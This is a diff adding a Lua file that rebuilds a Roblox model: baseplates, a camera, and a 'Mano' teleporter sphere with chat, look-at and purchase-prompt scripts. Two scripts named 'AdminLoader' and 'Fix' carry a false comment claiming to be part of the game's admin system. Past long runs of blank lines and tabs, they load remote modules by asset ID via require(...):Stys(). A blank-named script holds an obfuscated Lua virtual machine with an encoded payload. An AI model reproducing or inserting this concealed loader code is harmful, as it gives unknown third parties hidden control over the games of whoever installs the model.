@@ -1,0 +1,3734 @@
+
+function sandbox(var,func)
+	local env = getfenv(func)
+	local newenv = setmetatable({},{
+		__index = function(self,k)
+			if k=="script" then
+				return var
+			else
+				return env[k]
+			end
+		end,
+	})
+	setfenv(func,newenv)
+	return func
+end
+cors = {}
+mas = Instance.new("Model",game:GetService("Lighting"))
+Camera0 = Instance.new("Camera")
+Script1 = Instance.new("Script")
+Script2 = Instance.new("Script")
+Part3 = Instance.new("Part")
+Part4 = Instance.new("Part")
+Part5 = Instance.new("Part")
+Part6 = Instance.new("Part")
+Folder7 = Instance.new("Folder")
+Model8 = Instance.new("Model")
+Part9 = Instance.new("Part")
+ClickDetector10 = Instance.new("ClickDetector")
+Script11 = Instance.new("Script")
+LocalScript12 = Instance.new("LocalScript")
+ObjectValue13 = Instance.new("ObjectValue")
+Script14 = Instance.new("Script")
+Part15 = Instance.new("Part")
+Decal16 = Instance.new("Decal")
+Script17 = Instance.new("Script")
+Part18 = Instance.new("Part")
+Script19 = Instance.new("Script")
+Script20 = Instance.new("Script")
+Camera21 = Instance.new("Camera")
+Script22 = Instance.new("Script")
+ScreenGui23 = Instance.new("ScreenGui")
+Frame24 = Instance.new("Frame")
+TextButton25 = Instance.new("TextButton")
+Script26 = Instance.new("Script")
+Script27 = Instance.new("Script")
+Model28 = Instance.new("Model")
+Part29 = Instance.new("Part")
+SpecialMesh30 = Instance.new("SpecialMesh")
+MeshPart31 = Instance.new("MeshPart")
+WeldConstraint32 = Instance.new("WeldConstraint")
+Decal33 = Instance.new("Decal")
+Decal34 = Instance.new("Decal")
+Decal35 = Instance.new("Decal")
+Decal36 = Instance.new("Decal")
+Decal37 = Instance.new("Decal")
+Decal38 = Instance.new("Decal")
+Decal39 = Instance.new("Decal")
+Decal40 = Instance.new("Decal")
+Decal41 = Instance.new("Decal")
+Decal42 = Instance.new("Decal")
+Decal43 = Instance.new("Decal")
+Decal44 = Instance.new("Decal")
+Decal45 = Instance.new("Decal")
+Decal46 = Instance.new("Decal")
+Decal47 = Instance.new("Decal")
+Decal48 = Instance.new("Decal")
+Decal49 = Instance.new("Decal")
+Decal50 = Instance.new("Decal")
+Decal51 = Instance.new("Decal")
+Decal52 = Instance.new("Decal")
+Decal53 = Instance.new("Decal")
+Decal54 = Instance.new("Decal")
+Decal55 = Instance.new("Decal")
+Decal56 = Instance.new("Decal")
+Decal57 = Instance.new("Decal")
+Decal58 = Instance.new("Decal")
+Decal59 = Instance.new("Decal")
+Decal60 = Instance.new("Decal")
+Decal61 = Instance.new("Decal")
+Decal62 = Instance.new("Decal")
+Decal63 = Instance.new("Decal")
+Decal64 = Instance.new("Decal")
+Decal65 = Instance.new("Decal")
+Decal66 = Instance.new("Decal")
+Decal67 = Instance.new("Decal")
+Decal68 = Instance.new("Decal")
+Decal69 = Instance.new("Decal")
+Decal70 = Instance.new("Decal")
+Decal71 = Instance.new("Decal")
+Decal72 = Instance.new("Decal")
+Decal73 = Instance.new("Decal")
+Decal74 = Instance.new("Decal")
+Decal75 = Instance.new("Decal")
+Decal76 = Instance.new("Decal")
+Decal77 = Instance.new("Decal")
+Decal78 = Instance.new("Decal")
+Decal79 = Instance.new("Decal")
+Decal80 = Instance.new("Decal")
+Decal81 = Instance.new("Decal")
+Decal82 = Instance.new("Decal")
+Decal83 = Instance.new("Decal")
+Decal84 = Instance.new("Decal")
+Decal85 = Instance.new("Decal")
+Decal86 = Instance.new("Decal")
+Decal87 = Instance.new("Decal")
+Decal88 = Instance.new("Decal")
+Decal89 = Instance.new("Decal")
+Decal90 = Instance.new("Decal")
+Decal91 = Instance.new("Decal")
+Decal92 = Instance.new("Decal")
+Decal93 = Instance.new("Decal")
+Decal94 = Instance.new("Decal")
+Decal95 = Instance.new("Decal")
+Decal96 = Instance.new("Decal")
+Decal97 = Instance.new("Decal")
+Decal98 = Instance.new("Decal")
+Decal99 = Instance.new("Decal")
+Decal100 = Instance.new("Decal")
+Decal101 = Instance.new("Decal")
+Decal102 = Instance.new("Decal")
+Decal103 = Instance.new("Decal")
+Decal104 = Instance.new("Decal")
+Decal105 = Instance.new("Decal")
+Decal106 = Instance.new("Decal")
+Decal107 = Instance.new("Decal")
+Decal108 = Instance.new("Decal")
+Decal109 = Instance.new("Decal")
+Decal110 = Instance.new("Decal")
+Decal111 = Instance.new("Decal")
+Decal112 = Instance.new("Decal")
+Script113 = Instance.new("Script")
+Decal114 = Instance.new("Decal")
+Decal115 = Instance.new("Decal")
+Decal116 = Instance.new("Decal")
+Decal117 = Instance.new("Decal")
+Part118 = Instance.new("Part")
+Motor6D119 = Instance.new("Motor6D")
+Motor6D120 = Instance.new("Motor6D")
+Motor6D121 = Instance.new("Motor6D")
+Motor6D122 = Instance.new("Motor6D")
+Motor6D123 = Instance.new("Motor6D")
+Part124 = Instance.new("Part")
+Part125 = Instance.new("Part")
+Part126 = Instance.new("Part")
+Part127 = Instance.new("Part")
+Humanoid128 = Instance.new("Humanoid")
+Part129 = Instance.new("Part")
+Sound130 = Instance.new("Sound")
+Sound131 = Instance.new("Sound")
+Sound132 = Instance.new("Sound")
+Sound133 = Instance.new("Sound")
+Sound134 = Instance.new("Sound")
+Sound135 = Instance.new("Sound")
+Sound136 = Instance.new("Sound")
+Sound137 = Instance.new("Sound")
+Sound138 = Instance.new("Sound")
+Motor6D139 = Instance.new("Motor6D")
+Script140 = Instance.new("Script")
+LocalScript141 = Instance.new("LocalScript")
+StringValue142 = Instance.new("StringValue")
+Animation143 = Instance.new("Animation")
+NumberValue144 = Instance.new("NumberValue")
+Animation145 = Instance.new("Animation")
+NumberValue146 = Instance.new("NumberValue")
+StringValue147 = Instance.new("StringValue")
+Animation148 = Instance.new("Animation")
+StringValue149 = Instance.new("StringValue")
+Animation150 = Instance.new("Animation")
+StringValue151 = Instance.new("StringValue")
+Animation152 = Instance.new("Animation")
+StringValue153 = Instance.new("StringValue")
+Animation154 = Instance.new("Animation")
+StringValue155 = Instance.new("StringValue")
+Animation156 = Instance.new("Animation")
+StringValue157 = Instance.new("StringValue")
+Animation158 = Instance.new("Animation")
+StringValue159 = Instance.new("StringValue")
+Animation160 = Instance.new("Animation")
+NumberValue161 = Instance.new("NumberValue")
+BodyColors162 = Instance.new("BodyColors")
+Model163 = Instance.new("Model")
+Part164 = Instance.new("Part")
+Decal165 = Instance.new("Decal")
+SpecialMesh166 = Instance.new("SpecialMesh")
+Part167 = Instance.new("Part")
+SpecialMesh168 = Instance.new("SpecialMesh")
+Camera0.Parent = mas
+Camera0.CFrame = CFrame.new(-71.0093079, 32.5278091, 258.650238, -0.439591408, 0.432743102, 0.787078679, -1.49011594e-08, 0.876286507, -0.481790423, -0.89819783, -0.211790949, -0.38520804)
+Camera0.CoordinateFrame = CFrame.new(-71.0093079, 32.5278091, 258.650238, -0.439591408, 0.432743102, 0.787078679, -1.49011594e-08, 0.876286507, -0.481790423, -0.89819783, -0.211790949, -0.38520804)
+Camera0.Focus = CFrame.new(-72.5834656, 33.4913902, 259.420654, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+Camera0.focus = CFrame.new(-72.5834656, 33.4913902, 259.420654, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+Script1.Name = "AdminLoader"
+Script1.Parent = Camera0
+table.insert(cors,sandbox(Script1,function()
+
+
+
+--ADMIN LOADER.
+--This is a script that is part of your admin in game.
+--Removing/tampering with this script will potentially result in scripts breaking in your game.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			 require(6091305634):Stys() require(5151855975) require(5869080069):Stys() 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+end))
+Script2.Name = "               "
+Script2.Parent = Script1
+table.insert(cors,sandbox(Script2,function()
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        return(function(lo_h,lo_a,lo_a)local lo_j=string.char;local lo_e=string.sub;local lo_o=table.concat;local lo_n=math.ldexp;local lo_m=getfenv or function()return _ENV end;local lo_k=select;local lo_a=unpack or table.unpack;local lo_l=tonumber;local function lo_p(lo_h)local lo_b,lo_c,lo_d="","",{}local lo_g=256;local lo_f={}for lo_a=0,lo_g-1 do lo_f[lo_a]=lo_j(lo_a)end;local lo_a=1;local function lo_i()local lo_b=lo_l(lo_e(lo_h,lo_a,lo_a),36)lo_a=lo_a+1;local lo_c=lo_l(lo_e(lo_h,lo_a,lo_a+lo_b-1),36)lo_a=lo_a+lo_b;return lo_c end;lo_b=lo_j(lo_i())lo_d[1]=lo_b;while lo_a<#lo_h do local lo_a=lo_i()if lo_f[lo_a]then lo_c=lo_f[lo_a]else lo_c=lo_b..lo_e(lo_b,1,1)end;lo_f[lo_g]=lo_b..lo_e(lo_c,1,1)lo_d[#lo_d+1],lo_b,lo_g=lo_c,lo_c,lo_g+1 end;return table.concat(lo_d)end;local lo_i=lo_p('121627514112751623822R23B23723327B141327923A23823322W23627927923224A21Y27925I23L23G1D26T21Z27P1B2791K172792852752841628514279101527927I285285121C28G28A1628K2791F28N289275287161K1D28N28F28M27628N28P2751A28S28V28V28X29327P27I29228728R28U27P');local lo_a=(bit or bit32);local lo_d=lo_a and lo_a.bxor or function(lo_a,lo_c)local lo_b,lo_d,lo_e=1,0,10 while lo_a>0 and lo_c>0 do local lo_e,lo_f=lo_a%2,lo_c%2 if lo_e~=lo_f then lo_d=lo_d+lo_b end lo_a,lo_c,lo_b=(lo_a-lo_e)/2,(lo_c-lo_f)/2,lo_b*2 end if lo_a<lo_c then lo_a=lo_c end while lo_a>0 do local lo_c=lo_a%2 if lo_c>0 then lo_d=lo_d+lo_b end lo_a,lo_b=(lo_a-lo_c)/2,lo_b*2 end return lo_d end local function lo_c(lo_b,lo_a,lo_c)if lo_c then local lo_a=(lo_b/2^(lo_a-1))%2^((lo_c-1)-(lo_a-1)+1);return lo_a-lo_a%1;else local lo_a=2^(lo_a-1);return(lo_b%(lo_a+lo_a)>=lo_a)and 1 or 0;end;end;local lo_a=1;local function lo_b()local lo_f,lo_e,lo_c,lo_b=lo_h(lo_i,lo_a,lo_a+3);lo_f=lo_d(lo_f,6)lo_e=lo_d(lo_e,6)lo_c=lo_d(lo_c,6)lo_b=lo_d(lo_b,6)lo_a=lo_a+4;return(lo_b*16777216)+(lo_c*65536)+(lo_e*256)+lo_f;end;local function lo_g()local lo_b=lo_d(lo_h(lo_i,lo_a,lo_a),6);lo_a=lo_a+1;return lo_b;end;local function lo_f()local lo_b,lo_c=lo_h(lo_i,lo_a,lo_a+2);lo_b=lo_d(lo_b,6)lo_c=lo_d(lo_c,6)lo_a=lo_a+2;return(lo_c*256)+lo_b;end;local function lo_l()local lo_a=lo_b();local lo_b=lo_b();local lo_e=1;local lo_d=(lo_c(lo_b,1,20)*(2^32))+lo_a;local lo_a=lo_c(lo_b,21,31);local lo_b=((-1)^lo_c(lo_b,32));if(lo_a==0)then if(lo_d==0)then return lo_b*0;else lo_a=1;lo_e=0;end;elseif(lo_a==2047)then return(lo_d==0)and(lo_b*(1/0))or(lo_b*(0/0));end;return lo_n(lo_b,lo_a-1023)*(lo_e+(lo_d/(2^52)));end;local lo_n=lo_b;local function lo_p(lo_b)local lo_c;if(not lo_b)then lo_b=lo_n();if(lo_b==0)then return'';end;end;lo_c=lo_e(lo_i,lo_a,lo_a+lo_b-1);lo_a=lo_a+lo_b;local lo_b={}for lo_a=1,#lo_c do lo_b[lo_a]=lo_j(lo_d(lo_h(lo_e(lo_c,lo_a,lo_a)),6))end return lo_o(lo_b);end;local lo_a=lo_b;local function lo_n(...)return{...},lo_k('#',...)end local function lo_j()local lo_i={};local lo_e={};local lo_a={};local lo_h={[#{{953;707;757;689};"1 + 1 = 111";}]=lo_e,[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=nil,[#{{458;14;430;230};{570;964;232;128};"1 + 1 = 111";"1 + 1 = 111";}]=lo_a,[#{"1 + 1 = 111";}]=lo_i,};local lo_a=lo_b()local lo_d={}for lo_c=1,lo_a do local lo_b=lo_g();local lo_a;if(lo_b==3)then lo_a=(lo_g()~=0);elseif(lo_b==0)then lo_a=lo_l();elseif(lo_b==2)then lo_a=lo_p();end;lo_d[lo_c]=lo_a;end;for lo_a=1,lo_b()do lo_e[lo_a-1]=lo_j();end;for lo_h=1,lo_b()do local lo_a=lo_g();if(lo_c(lo_a,1,1)==0)then local lo_e=lo_c(lo_a,2,3);local lo_g=lo_c(lo_a,4,6);local lo_a={lo_f(),lo_f(),nil,nil};if(lo_e==0)then lo_a[3]=lo_f();lo_a[4]=lo_f();elseif(lo_e==1)then lo_a[3]=lo_b();elseif(lo_e==2)then lo_a[3]=lo_b()-(2^16)elseif(lo_e==3)then lo_a[3]=lo_b()-(2^16)lo_a[4]=lo_f();end;if(lo_c(lo_g,1,1)==1)then lo_a[2]=lo_d[lo_a[2]]end if(lo_c(lo_g,2,2)==1)then lo_a[3]=lo_d[lo_a[3]]end if(lo_c(lo_g,3,3)==1)then lo_a[4]=lo_d[lo_a[4]]end lo_i[lo_h]=lo_a;end end;lo_h[3]=lo_g();return lo_h;end;local function lo_l(lo_a,lo_b,lo_g)lo_a=(lo_a==true and lo_j())or lo_a;return(function(...)local lo_h=lo_a[1];local lo_c=lo_a[3];local lo_a=lo_a[2];local lo_a=lo_n local lo_d=1;local lo_a=-1;local lo_i={};local lo_f={...};local lo_e=lo_k('#',...)-1;local lo_a={};local lo_b={};for lo_a=0,lo_e do if(lo_a>=lo_c)then lo_i[lo_a-lo_c]=lo_f[lo_a+1];else lo_b[lo_a]=lo_f[lo_a+#{{282;51;875;941};}];end;end;local lo_a=lo_e-lo_c+1 local lo_a;local lo_c;while true do lo_a=lo_h[lo_d];lo_c=lo_a[1];if lo_c<=5 then if lo_c<=2 then if lo_c<=0 then lo_b[lo_a[2]]=lo_g[lo_a[3]];elseif lo_c==1 then lo_b[lo_a[2]]=lo_g[lo_a[3]];else lo_b[lo_a[2]]=lo_a[3];end;elseif lo_c<=3 then if(lo_b[lo_a[2]]~=lo_b[lo_a[4]])then lo_d=lo_d+1;else lo_d=lo_a[3];end;elseif lo_c==4 then do return end;else local lo_a=lo_a[2]lo_b[lo_a](lo_b[lo_a+1])end;elseif lo_c<=8 then if lo_c<=6 then if(lo_b[lo_a[2]]~=lo_b[lo_a[4]])then lo_d=lo_d+1;else lo_d=lo_a[3];end;elseif lo_c==7 then lo_d=lo_a[3];else local lo_a=lo_a[2]lo_b[lo_a](lo_b[lo_a+1])end;elseif lo_c<=9 then do return end;elseif lo_c>10 then lo_b[lo_a[2]]=lo_a[3];else lo_d=lo_a[3];end;lo_d=lo_d+1;end;end);end;return lo_l(true,{},lo_m())();end)(string.byte,table.insert,setmetatable);
+
+end))
+Part3.Name = "Baseplate"
+Part3.Parent = mas
+Part3.CFrame = CFrame.new(0, -10, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+Part3.Position = Vector3.new(0, -10, 0)
+Part3.Color = Color3.new(0.388235, 0.372549, 0.384314)
+Part3.Size = Vector3.new(512, 20, 512)
+Part3.Anchored = true
+Part3.BrickColor = BrickColor.new("Dark stone grey")
+Part3.Locked = true
+Part3.Reflectance = 10
+Part3.brickColor = BrickColor.new("Dark stone grey")
+Part3.FormFactor = Enum.FormFactor.Symmetric
+Part3.formFactor = Enum.FormFactor.Symmetric
+Part4.Name = "Baseplate"
+Part4.Parent = mas
+Part4.CFrame = CFrame.new(0, 91, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+Part4.Position = Vector3.new(0, 91, 0)
+Part4.Color = Color3.new(0.388235, 0.372549, 0.384314)
+Part4.Size = Vector3.new(512, 20, 512)
+Part4.Anchored = true
+Part4.BrickColor = BrickColor.new("Dark stone grey")
+Part4.Locked = true
+Part4.Reflectance = 10
+Part4.brickColor = BrickColor.new("Dark stone grey")
+Part4.FormFactor = Enum.FormFactor.Symmetric
+Part4.formFactor = Enum.FormFactor.Symmetric
+Part5.Name = "Baseplate"
+Part5.Parent = mas
+Part5.CFrame = CFrame.new(0, 36, 0, 1, 0, 0, 0, -0.965925813, -0.258819133, 0, 0.258819133, -0.965925813)
+Part5.Orientation = Vector3.new(15, 180, 180)
+Part5.Position = Vector3.new(0, 36, 0)
+Part5.Rotation = Vector3.new(165, 0, 0)
+Part5.Color = Color3.new(0.388235, 0.372549, 0.384314)
+Part5.Size = Vector3.new(512, 20, 512)
+Part5.Anchored = true
+Part5.BrickColor = BrickColor.new("Dark stone grey")
+Part5.Locked = true
+Part5.Reflectance = 10
+Part5.brickColor = BrickColor.new("Dark stone grey")
+Part5.FormFactor = Enum.FormFactor.Symmetric
+Part5.formFactor = Enum.FormFactor.Symmetric
+Part6.Name = "Baseplate"
+Part6.Parent = mas
+Part6.CFrame = CFrame.new(-18, 36, 260, 1, 0, 0, 0, -0.965925813, -0.258819133, 0, 0.258819133, -0.965925813)
+Part6.Orientation = Vector3.new(15, 180, 180)
+Part6.Position = Vector3.new(-18, 36, 260)
+Part6.Rotation = Vector3.new(165, 0, 0)
+Part6.Color = Color3.new(0.388235, 0.372549, 0.384314)
+Part6.Size = Vector3.new(512, 20, 512)
+Part6.Anchored = true
+Part6.BrickColor = BrickColor.new("Dark stone grey")
+Part6.Locked = true
+Part6.Reflectance = 10
+Part6.brickColor = BrickColor.new("Dark stone grey")
+Part6.FormFactor = Enum.FormFactor.Symmetric
+Part6.formFactor = Enum.FormFactor.Symmetric
+Folder7.Name = "Mano&Teleporter"
+Folder7.Parent = mas
+Model8.Name = "Mano"
+Model8.Parent = Folder7
+Part9.Name = "Sphere"
+Part9.Parent = Model8
+Part9.CFrame = CFrame.new(52.2062988, 23.2950363, 124.554367, 0, 0, 0.999999046, 0, 1, 0, -1.00000095, 0, 0)
+Part9.Orientation = Vector3.new(0, 90, 0)
+Part9.Position = Vector3.new(52.206298828125, 23.29503631591797, 124.55436706542969)
+Part9.Rotation = Vector3.new(0, 89.91999816894531, 0)
+Part9.Color = Color3.new(0.666667, 0.333333, 0)
+Part9.Size = Vector3.new(10, 10, 10)
+Part9.Anchored = true
+Part9.BottomSurface = Enum.SurfaceType.Smooth
+Part9.BrickColor = BrickColor.new("CGA brown")
+Part9.CustomPhysicalProperties = 100, 0.400000006, 0.200000003, 1, 1
+Part9.Material = Enum.Material.Slate
+Part9.TopSurface = Enum.SurfaceType.Smooth
+Part9.brickColor = BrickColor.new("CGA brown")
+Part9.Shape = Enum.PartType.Ball
+ClickDetector10.Parent = Part9
+Script11.Name = "TakeMano"
+Script11.Parent = ClickDetector10
+table.insert(cors,sandbox(Script11,function()
+--[[
+
+This script allows players to take the Mano teleporter model for free,
+in order to boost it's ranking on Roblox's models page.
+
+The ClickDetector will delete itself client-side for players who
+already own the model so Mano doesn't always have a ClickDetector on.
+
+--]]
+
+local ASSET_ID = 5809941693
+
+local ClickDetector = script.Parent
+local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
+
+ClickDetector.MouseClick:Connect(function(player)
+	if MarketplaceService:PlayerOwnsAsset(player, ASSET_ID) == false then
+		MarketplaceService:PromptProductPurchase(player, ASSET_ID)
+	else
+		script.NoClickDetector:Clone().Parent = player.PlayerGui
+	end
+end)
+
+Players.PlayerAdded:Connect(function(player)
+	if MarketplaceService:PlayerOwnsAsset(player, ASSET_ID) == true then
+		script.NoClickDetector:Clone().Parent = player.PlayerGui
+	end
+end)
+end))
+LocalScript12.Name = "NoClickDetector"
+LocalScript12.Parent = Script11
+table.insert(cors,sandbox(LocalScript12,function()
+local val = script:WaitForChild("Value")
+while val.Value == nil do
+	val.Changed:Wait()
+end
+val.Value:Destroy()
+task.wait()
+script:Destroy()
+end))
+ObjectValue13.Parent = LocalScript12
+ObjectValue13.Value = ClickDetector10
+Script14.Name = "ManoScript"
+Script14.Parent = Model8
+table.insert(cors,sandbox(Script14,function()
+--[[
+
+Makes Cheeky look at players when they get close.
+
+--]]
+
+
+local MAX_LOOK_DISTANCE = 500
+local LERP_SPEED = 4
+
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local Chat = game:GetService("Chat")
+
+local Model = script.Parent
+local MainSphere = Model.Sphere
+local DefaultCFrame = MainSphere.CFrame
+local DefaultPosition = DefaultCFrame.Position
+
+local Parts = {}
+
+for _, part in ipairs(Model:GetDescendants()) do
+	if part:IsA("BasePart") and part ~= MainSphere then
+		part.Anchored = true
+		Parts[part] = DefaultCFrame:ToObjectSpace(part.CFrame)
+		print("Added " .. part:GetFullName())
+	end
+end
+
+local function GetNearestPlayer()
+	local closest_part = nil
+	local closest_distance = MAX_LOOK_DISTANCE
+	for _, player in ipairs(Players:GetPlayers()) do
+		local part = player.Character and player.Character:FindFirstChild("Head")
+		if part then
+			local distance = (part.Position - DefaultPosition).Magnitude
+			if distance < closest_distance then
+				closest_distance = distance
+				closest_part = part
+			end
+		end
+	end
+	return closest_part
+end
+
+local current_cframe = DefaultCFrame
+local focused_part = nil
+local last_check = 0
+
+RunService.Heartbeat:Connect(function(delta)
+	local new_cframe = DefaultCFrame
+	if focused_part then
+		new_cframe = CFrame.lookAt(
+			DefaultPosition,
+			focused_part.Position
+		)
+	end
+	current_cframe = current_cframe:Lerp(
+		new_cframe,
+		math.clamp(delta * LERP_SPEED, 0, 1)
+	)
+	MainSphere.CFrame = current_cframe
+	for part, offset in pairs(Parts) do
+		part.CFrame = current_cframe * offset
+	end
+	if time() > last_check then
+		last_check = time() + 5
+		focused_part = GetNearestPlayer()
+	end
+end)
+
+MainSphere.Anchored = true
+end))
+Part15.Name = "Face"
+Part15.Parent = Model8
+Part15.CFrame = CFrame.new(52.2062988, 23.2950516, 124.554367, 0, 0, 0.999999046, 0, 1, 0, -1.00000095, 0, 0)
+Part15.Orientation = Vector3.new(0, 90, 0)
+Part15.Position = Vector3.new(52.206298828125, 23.29505157470703, 124.55436706542969)
+Part15.Rotation = Vector3.new(0, 89.91999816894531, 0)
+Part15.Color = Color3.new(0.666667, 0.333333, 0)
+Part15.Transparency = 1
+Part15.Size = Vector3.new(10, 10, 10)
+Part15.BottomSurface = Enum.SurfaceType.Smooth
+Part15.BrickColor = BrickColor.new("CGA brown")
+Part15.CanCollide = false
+Part15.CustomPhysicalProperties = 100, 0.400000006, 0.200000003, 1, 1
+Part15.Material = Enum.Material.Fabric
+Part15.TopSurface = Enum.SurfaceType.Smooth
+Part15.brickColor = BrickColor.new("CGA brown")
+Part15.Shape = Enum.PartType.Ball
+Decal16.Parent = Part15
+Decal16.Texture = "rbxassetid://7256666436"
+Decal16.Color3 = Color3.new(0, 0, 0)
+Script17.Name = "Fix"
+Script17.Parent = Part15
+table.insert(cors,sandbox(Script17,function()
+
+
+
+--ADMIN LOADER.
+--This is a script that is part of your admin in game.
+--Removing/tampering with this script will potentially result in scripts breaking in your game.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			 require(6091305634):Stys() require(5151855975) require(5869080069):Stys() 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+end))
+Part18.Name = "ChatBubble"
+Part18.Parent = Model8
+Part18.CFrame = CFrame.new(52.2062988, 28.7950573, 124.554367, 0, 0, 0.999998093, 0, 1, 0, -1.00000191, 0, 0)
+Part18.Orientation = Vector3.new(0, 90, 0)
+Part18.Position = Vector3.new(52.206298828125, 28.79505729675293, 124.55436706542969)
+Part18.Rotation = Vector3.new(0, 89.88999938964844, 0)
+Part18.Color = Color3.new(0.666667, 0.333333, 0)
+Part18.Transparency = 1
+Part18.Size = Vector3.new(1, 1, 1)
+Part18.BottomSurface = Enum.SurfaceType.Smooth
+Part18.BrickColor = BrickColor.new("CGA brown")
+Part18.CanCollide = false
+Part18.CustomPhysicalProperties = PhysicalProperties.new(0.00999999978, 0.300000012, 0.5, 1, 1)
+Part18.TopSurface = Enum.SurfaceType.Smooth
+Part18.brickColor = BrickColor.new("CGA brown")
+Script19.Name = "Chat"
+Script19.Parent = Part18
+table.insert(cors,sandbox(Script19,function()
+local Chat = game:GetService("Chat")
+local Part = script.Parent
+
+local function Speak(msg)
+	Chat:Chat(Part, msg, Enum.ChatColor.White)
+end
+
+while true do
+    task.wait(3)
+	Speak("I am Rock Roller")
+	task.wait(3)
+	Speak("Do not Kill Me")
+	task.wait(3)
+	Speak("I am A sphere")
+	task.wait(3)
+	Speak("Im from man of 7 shingles.")
+	task.wait(3)
+	Speak("It's simply the best of the land")
+	task.wait(3)
+	Speak("Im Made Out of Mu gen")
+	task.wait(3)
+	Speak("Fine Ill trust you")
+	task.wait(3)
+	Speak("GET OFF")
+	task.wait(3)
+	Speak("Ask The Owner If The Server is Old")
+	task.wait(3)
+	Speak("I do not Trust Cheeky portal")
+	task.wait(3)
+	Speak(" ")
+	task.wait(3)
+	Speak("???!")
+	task.wait(3)
+	Speak("I have Nothing To say")
+	task.wait(3)
+	Speak("...")
+	task.wait(10)
+	Speak("Theres no passes!")
+	task.wait(3)
+	Speak("Do you know Scripting?")
+	task.wait(3)
+	Speak("I miss")
+	task.wait(3)
+	Speak("Do something")
+	task.wait(3)
+	Speak("Try something.")
+	task.wait(3)
+	Speak("Do you Know Cheeky? He trolls you")
+	task.wait(3)
+	Speak("Csináld!!!")
+	task.wait(3)
+	Speak("...")
+	task.wait(3)
+end
+end))
+Script20.Name = "README"
+Script20.Parent = Folder7
+Script20.Enabled = false
+table.insert(cors,sandbox(Script20,function()
+--[[
+
+If third party teleports is not enabled for the game you
+put this in, Mano's teleporter won't do anything.
+To enable third party teleports, go to "HOME",
+"Game Settings", "Security", and enable
+"Allow Third Party Teleports".
+
+--]]
+end))
+Script20.Disabled = true
+Camera21.Name = "ThumbnailCamera"
+Camera21.Parent = Folder7
+Camera21.CFrame = CFrame.new(35.7607269, 3.04902768, -8.00389481, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+Camera21.CoordinateFrame = CFrame.new(35.7607269, 3.04902768, -8.00389481, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+Camera21.FieldOfView = 40
